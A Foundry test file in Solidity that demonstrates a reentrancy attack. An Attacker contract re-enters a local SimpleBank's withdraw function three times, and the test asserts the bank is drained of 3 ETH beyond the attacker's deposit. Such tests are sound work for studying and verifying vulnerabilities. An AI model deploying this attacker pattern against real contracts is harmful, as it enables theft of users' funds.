// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/SimpleBank.sol";

// Attacker with limited reentries + enough bank funds to complete
contract Attacker {
    SimpleBank public bank;
    uint256 public count;

    constructor(address _bank) { bank = SimpleBank(_bank); }

    receive() external payable {
        if (count < 3) {
            count++;
            bank.withdraw();
        }
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }
}

contract BlackHatTest is Test {
    SimpleBank public bank;
    Attacker public attacker;

    address alice = makeAddr("alice");
    address bob   = makeAddr("bob");
    address charlie = makeAddr("charlie");
    address dave  = makeAddr("dave");

    function setUp() public {
        bank = new SimpleBank();
        attacker = new Attacker(address(bank));

        vm.deal(alice,   10 ether);
        vm.deal(bob,     10 ether);
        vm.deal(charlie, 10 ether);
        vm.deal(dave,    10 ether);
        vm.deal(address(attacker), 10 ether);
    }

    function test_ReentrancyAttack_DrainsBank() public {
        // 4 users deposit 1 ETH each = 4 ETH in bank
        vm.prank(alice);   bank.deposit{value: 1 ether}();
        vm.prank(bob);     bank.deposit{value: 1 ether}();
        vm.prank(charlie); bank.deposit{value: 1 ether}();
        vm.prank(dave);    bank.deposit{value: 1 ether}();

        uint256 attackerBefore = address(attacker).balance;

        // Attacker deposits 1 ETH, then reenters 3 times
        vm.prank(address(attacker));
        attacker.attack{value: 1 ether}();

        // Attacker stole 3 ETH profit (4 total withdrawal minus their own 1 ETH deposit)
        assertEq(address(attacker).balance, attackerBefore + 3 ether);
        // Bank drained: 5 ETH total - 4 withdrawn = 1 ETH left
        assertEq(bank.getBankBalance(), 1 ether);
    }
}